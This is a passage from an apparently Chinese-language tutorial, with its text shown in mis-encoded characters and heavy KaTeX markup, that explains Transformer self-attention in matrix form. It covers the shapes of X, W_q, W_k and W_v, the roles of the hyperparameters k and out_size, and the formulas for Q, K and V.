<p>æ¥ä¸‹æ¥ï¼Œè®©æˆ‘ä»¬ä»<strong>çŸ©é˜µçš„è§†è§’</strong>é‡æ–°å®¡è§†å¹¶å®ç°ä¸Šè¿°çš„æ³¨æ„åŠ›è®¡ç®—è¿‡ç¨‹ã€‚å¦‚æœä½¿ç”¨å¾ªç¯é€ä¸ªå¤„ç†ä¸Šè¿°æµç¨‹ï¼Œè™½ç„¶å¾ˆç›´è§‚ï¼Œä½†åœ¨å®é™…è®¡ç®—çš„æ—¶å€™ä¼šéå¸¸ä½æ•ˆã€‚è€Œå°†è¿™äº›æ“ä½œè½¬åŒ–ä¸ºçŸ©é˜µè¿ç®—ï¼Œä¸ä»…èƒ½è®©è¡¨è¾¾æ›´åŠ ç®€æ´ï¼Œæ›´é‡è¦çš„æ˜¯èƒ½å¤Ÿå……åˆ†åˆ©ç”¨ç°ä»£ç¡¬ä»¶ï¼ˆå°¤å…¶æ˜¯GPUï¼‰å¼ºå¤§çš„<strong>å¹¶è¡Œè®¡ç®—èƒ½åŠ›</strong>ï¼Œå®ç°æè‡´çš„åŠ é€Ÿã€‚</p>
<p><strong>æ³¨æ„ï¼šä¸‹é¢çš„è®¡ç®—è¿‡ç¨‹æœ‰ç‚¹ç»•ï¼Œæ¨èè‡ªå·±æ‹¿ç¬”åœ¨è‰ç¨¿çº¸ä¸Šè‡ªå·±æ¨ä¸€ç¯‡ï¼Œå°¤å…¶æ˜¯è¦æ³¨æ„æ¯ä¸ªçŸ©é˜µçš„å½¢çŠ¶</strong></p>
<p>æˆ‘ä»¬é¦–å…ˆå°†æ•´ä¸ªåºåˆ—å½¢å¼åŒ–ã€‚å‡è®¾åºåˆ—é•¿åº¦ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span>ï¼Œæ¯ä¸ªè¯çš„ç‰¹å¾ç»´åº¦ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>ï¼Œé‚£ä¹ˆæ•´ä¸ªè¾“å…¥åºåˆ—å¾ˆè‡ªç„¶åœ°å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªå½¢çŠ¶ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, embed\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span> çš„çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>ã€‚æ¯ä¸€è¡Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">X[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span> å°±å¯¹åº”ä¸€ä¸ªè¯çš„åµŒå…¥å‘é‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚Transformer çš„æ ¸å¿ƒç›®æ ‡ï¼Œæ­£æ˜¯å°†è¿™ä¸ªè¾“å…¥çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>ï¼Œé€šè¿‡ä¸€ç³»åˆ—å¯å­¦ä¹ çš„æ³¨æ„åŠ›æ“ä½œï¼Œè½¬åŒ–ä¸ºä¸€ä¸ªè•´å«äº†ä¸°å¯Œä¸Šä¸‹æ–‡ä¿¡æ¯çš„è¾“å‡ºçŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>ï¼Œå…¶å½¢çŠ¶é€šå¸¸ä¸ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> ä¿æŒä¸€è‡´ã€‚</p>
<p>ä¸ºäº†å®ç°å¯å­¦ä¹ çš„æ³¨æ„åŠ›ï¼Œæˆ‘ä»¬éœ€è¦å¼•å…¥ä¸‰ç»„ç‹¬ç«‹çš„æƒé‡çŸ©é˜µï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>ã€<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>ã€‚å®ƒä»¬çš„å½¢çŠ¶è®¾è®¡å¦‚ä¸‹ï¼š</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> çš„å½¢çŠ¶å‡ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(embed\_size, k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span></span>ã€‚</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> çš„å½¢çŠ¶ä¸º <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(embed\_size, out\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span>ã€‚</li>
</ul>
<p>è¿™é‡Œå‡ºç°äº†ä¸¤ä¸ªå¯è°ƒå‚æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>ã€‚</p>
<ul>
<li><strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span></strong> å†³å®šäº†è¾“å‡ºçŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span> çš„ç‰¹å¾ç»´åº¦ã€‚åœ¨æ ‡å‡† Transformer ä¸­ï¼Œä¸ºäº†ä¾¿äºæ®‹å·®è¿æ¥å’Œå±‚æ ‡å‡†åŒ–ç­‰æ“ä½œï¼Œé€šå¸¸ä»¤ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>=</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size = embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>ï¼Œå³ä¿æŒè¾“å…¥è¾“å‡ºç»´åº¦ä¸€è‡´ã€‚</li>
<li>è€Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span><strong>æ˜¯ä¸€ä¸ªéœ€è¦ç²¾å¿ƒè®¾è®¡è€Œééšæ„æŒ‡å®šçš„å…³é”®è¶…å‚æ•°</strong>ã€‚å®ƒå†³å®šäº†æ³¨æ„åŠ›åŒ¹é…è¿‡ç¨‹çš„â€œç‰¹å¾åˆ†è¾¨ç‡â€æˆ–â€œæ¯”è¾ƒæ·±åº¦â€ã€‚ä½ å¯ä»¥å°†å…¶ç†è§£ä¸ºåœ¨è®¡ç®—æ³¨æ„åŠ›æ—¶ï¼Œæ¨¡å‹ç”¨äºæ¯”å¯¹Queryå’ŒKeyçš„â€œç‰¹å¾ä¸“ç²¾åº¦â€ã€‚è¾ƒå¤§çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> æ„å‘³ç€æ¨¡å‹å¯ä»¥ä½¿ç”¨æ›´ä¸°å¯Œçš„ç‰¹å¾è¿›è¡Œç²¾ç»†åŒ¹é…ï¼Œä½†ä¹Ÿå¯èƒ½å¸¦æ¥è¿‡æ‹Ÿåˆé£é™©ï¼›è¾ƒå°çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> åˆ™è¿«ä½¿æ¨¡å‹å­¦ä¹ æ›´æ³›åŒ–ã€æ›´ç²¾ç®€çš„åŒ¹é…æ¨¡å¼ã€‚è¿™ä¸ªç»´åº¦çš„é€‰æ‹©ï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨<strong>æ¨¡å‹è¡¨è¾¾åŠ›ä¸è®¡ç®—æ•ˆç‡ä¹‹é—´å¯»æ±‚å¹³è¡¡</strong>ï¼Œå®ƒå¦‚åŒæ‘„å½±ä¸­çš„â€œå¯¹ç„¦ç²¾åº¦â€â€”â€”å¹¶éè¶Šé«˜è¶Šå¥½ï¼Œè€Œæ˜¯è¦é€‚é…ä»»åŠ¡çš„éœ€æ±‚ã€‚æš‚ä¸”æç½®ä¸è°ˆã€‚</li>
</ul>
<p>æœ‰äº†è¿™äº›æƒé‡çŸ©é˜µï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä¸€æ¬¡æ€§ä¸ºæ•´ä¸ªåºåˆ—ç”Ÿæˆå…¶å¯¹åº”çš„æŸ¥è¯¢ï¼ˆ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>ï¼‰ã€é”®ï¼ˆ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span>ï¼‰å’Œå€¼ï¼ˆ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span>ï¼‰çŸ©é˜µï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>Q</mi><mo>=</mo><mi>X</mi><mo>â‹…</mo><msub><mi>W</mi><mi>q</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mo>=</mo><mi>X</mi><mo>â‹…</mo><msub><mi>W</mi><mi>k</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>V</mi><mo>=</mo><mi>X</mi><mo>â‹…</mo><msub><mi>W</mi><mi>v</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{matrix}
Q = X\cdot W_{q} &amp; (seq\_len,k)
 \\
K = X\cdot W_{k} &amp; (seq\_len,k)
 \\
V = X\cdot W_{v} &amp; (seq\_len,out\_size) 
\end{matrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" 